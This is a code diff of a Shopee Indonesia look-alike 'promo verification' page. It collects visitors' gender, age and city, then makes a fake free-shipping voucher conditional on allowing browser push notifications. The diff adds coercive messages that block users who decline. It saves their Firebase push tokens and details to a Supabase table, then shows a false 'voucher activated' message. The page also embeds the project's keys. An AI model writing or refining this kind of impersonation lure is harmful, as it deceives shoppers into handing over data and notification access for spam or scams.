@@ -4,38 +4,32 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Shopee Indonesia | Verifikasi Promo</title>
-    
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-messaging-compat.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
     <style>
-        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f5f5f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        body { font-family: sans-serif; background-color: #f5f5f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
         .card { background: white; width: 90%; max-width: 400px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 25px; text-align: center; }
         .header img { width: 100px; margin-bottom: 15px; }
-        h2 { font-size: 18px; color: #333; margin-top: 0; }
-        p { font-size: 14px; color: #666; line-height: 1.4; }
-        select, input, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #ddd; font-size: 16px; box-sizing: border-box; }
-        .btn-shopee { background-color: #ee4d2d; color: white; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 15px; }
+        select, input, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #ddd; font-size: 16px; }
+        .btn-shopee { background-color: #ee4d2d; color: white; border: none; font-weight: bold; cursor: pointer; }
         .hidden { display: none; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ee4d2d; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .info-kecil { font-size: 11px; color: #999; margin-top: -5px; margin-bottom: 10px; display: block; }
+        .error-text { color: #ee4d2d; font-size: 13px; font-weight: bold; margin-bottom: 10px; border: 1px solid #ee4d2d; padding: 10px; border-radius: 4px; background: #fff5f2; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" alt="Shopee">
-    </div>
-
-    <div id="loadingSection">
+    <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" alt="Shopee"></div>
+    
+    <div id="loadingSection" class="hidden">
         <div class="loader"></div>
-        <p>Memuat preferensi belanja...</p>
+        <p>Memproses verifikasi...</p>
     </div>
 
-    <div id="formSection" class="hidden">
+    <div id="formSection">
         <h2 id="formTitle">Pilih Jenis Kelamin</h2>
         
         <div id="stepGender">
@@ -48,60 +42,47 @@
 
         <div id="stepAge" class="hidden">
             <select id="age" onchange="nextStep('city')">
-                <option value="">-- Pilih Rentang Usia --</option>
-                <option value="18-25">18-25 Tahun</option>
-                <option value="26-35">26-35 Tahun</option>
-                <option value="36+">Diatas 35 Tahun</option>
+                <option value="">-- Pilih Usia --</option>
+                <option value="18-25">18-25</option>
+                <option value="26-35">26-35</option>
+                <option value="36+">36+</option>
             </select>
         </div>
 
         <div id="stepCity" class="hidden">
-            <p style="font-size: 12px; color: #ee4d2d; margin-bottom: 5px;">Input Kabupaten/Kota Pengiriman</p>
-            <input type="text" id="cityInput" placeholder="Contoh: Lampung Utara" autocomplete="off">
-            <span class="info-kecil">*Ketik manual nama Kabupaten/Kota Anda</span>
-            <button class="btn-shopee" onclick="selectCityManual()">LANJUTKAN</button>
+            <div id="msgBlock" class="hidden">
+                <div class="error-text">
+                    PENTING: Anda WAJIB mengizinkan notifikasi untuk menerima info promo & voucher gratis ongkir.
+                </div>
+            </div>
+            <input type="text" id="cityInput" placeholder="Masukkan Kota Anda">
+            <p style="font-size: 11px; color: #666;">Klik tombol di bawah dan pilih 'IZINKAN' / 'ALLOW'</p>
+            <button class="btn-shopee" onclick="finalizeSubscription()">KLAIM PROMO SEKARANG</button>
         </div>
     </div>
 
     <div id="redirectSection" class="hidden">
         <h2 style="color: #2ecc71;">Verifikasi Berhasil!</h2>
-        <p>Voucher Gratis Ongkir diaktifkan.</p>
-        <button class="btn-shopee" onclick="redirectToShopee()">BUKA APLIKASI SHOPEE</button>
+        <p>Selamat! Voucher Anda telah aktif.</p>
+        <button class="btn-shopee" onclick="redirectToShopee()">BUKA SHOPEE</button>
     </div>
 </div>
 
 <script>
-    // --- KONFIGURASI ---
     const firebaseConfig = {
         apiKey: "AIzaSyD_zJ9VxNeNZCBwaXpzgHbbfmw3Ymj5QTA",
         authDomain: "shopee-promo.firebaseapp.com",
         projectId: "shopee-promo",
         storageBucket: "shopee-promo.firebasestorage.app",
         messagingSenderId: "526441713326",
-        appId: "1:526441713326:web:4ba5bb996f44e98bc5673f",
-        measurementId: "G-L6NTGB9CE6"
+        appId: "1:526441713326:web:4ba5bb996f44e98bc5673f"
     };
-
-    const SUPABASE_URL = "https://zscupvelldysboqatuee.supabase.co";
-    const SUPABASE_KEY = "sb_publishable_0PlYfd9A6FxFzO6YqMznrA_4RCpF9XR";
-    const VAPID_KEY = "BPVouVO9zg4a1ZZ81K02MjTA5mgc-mxExWNaALL1PsBevaUHJ-WnKykmUJogmH26TtX9S5c9wHbpZ9uaRfnKY68";
 
     firebase.initializeApp(firebaseConfig);
     const messaging = firebase.messaging();
-    const mySupabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    const mySupabase = supabase.createClient("https://zscupvelldysboqatuee.supabase.co", "sb_publishable_0PlYfd9A6FxFzO6YqMznrA_4RCpF9XR");
 
     let userData = { gender: '', age: '', city: '', token: '' };
-    const targetLink = new URLSearchParams(window.location.search).get('target') || 'https://shopee.co.id';
-
-    window.onload = function() {
-        setTimeout(() => {
-            if (localStorage.getItem('shopee_subbed') === 'true') {
-                showSection('redirectSection');
-            } else {
-                showSection('formSection');
-            }
-        }, 1000);
-    };
 
     function showSection(id) {
         document.getElementById('loadingSection').classList.add('hidden');
@@ -115,46 +96,53 @@
             userData.gender = document.getElementById('gender').value;
             document.getElementById('stepGender').classList.add('hidden');
             document.getElementById('stepAge').classList.remove('hidden');
-            document.getElementById('formTitle').innerText = "Pilih Rentang Usia";
         } else if (step === 'city') {
             userData.age = document.getElementById('age').value;
             document.getElementById('stepAge').classList.add('hidden');
             document.getElementById('stepCity').classList.remove('hidden');
-            document.getElementById('formTitle').innerText = "Lokasi Pengiriman";
         }
-    }
-
-    async function selectCityManual() {
-        const cityVal = document.getElementById('cityInput').value;
-        if (cityVal.length < 3) {
-            alert("Silakan masukkan nama Kabupaten/Kota dengan benar.");
-            return;
-        }
-        userData.city = cityVal;
-        await finalizeSubscription();
     }
 
     async function finalizeSubscription() {
-        showSection('loadingSection');
+        const cityVal = document.getElementById('cityInput').value;
+        if(cityVal.length < 3) return alert("Masukkan nama kota Anda");
+        
+        userData.city = cityVal;
+        document.getElementById('msgBlock').classList.add('hidden');
+
         try {
             const permission = await Notification.requestPermission();
-            if (permission === 'granted') {
-                const token = await messaging.getToken({ vapidKey: VAPID_KEY });
-                if (token) {
-                    userData.token = token;
-                    await mySupabase.from('subscribers').upsert([userData], { onConflict: 'token' });
+            
+            if (permission !== 'granted') {
+                // JIKA USER MENOLAK
+                document.getElementById('msgBlock').classList.remove('hidden');
+                alert("MAAF: Izin notifikasi diperlukan untuk mengambil voucher promo.");
+                return; // Berhenti di sini, tidak lanjut ke Supabase/Redirect
+            }
+
+            // JIKA USER MENGIZINKAN
+            showSection('loadingSection');
+            const t = await messaging.getToken({ vapidKey: "BPVouVO9zg4a1ZZ81K02MjTA5mgc-mxExWNaALL1PsBevaUHJ-WnKykmUJogmH26TtX9S5c9wHbpZ9uaRfnKY68" });
+            
+            if (t) {
+                userData.token = t;
+                const { error } = await mySupabase.from('subscriber').insert([userData]);
+                
+                if (!error) {
                     localStorage.setItem('shopee_subbed', 'true');
+                    showSection('redirectSection');
+                } else {
+                    alert("Gagal menyimpan data. Coba lagi.");
+                    showSection('formSection');
                 }
             }
-        } catch (e) { 
-            console.error("Gagal simpan:", e); 
+        } catch (e) {
+            alert("Terjadi kesalahan teknis. Pastikan Anda membuka link HTTPS resmi.");
+            showSection('formSection');
         }
-        showSection('redirectSection');
     }
 
-    function redirectToShopee() {
-        window.location.href = targetLink;
-    }
+    function redirectToShopee() { window.location.href = "https://shopee.co.id"; }
 </script>
 </body>
 </html>
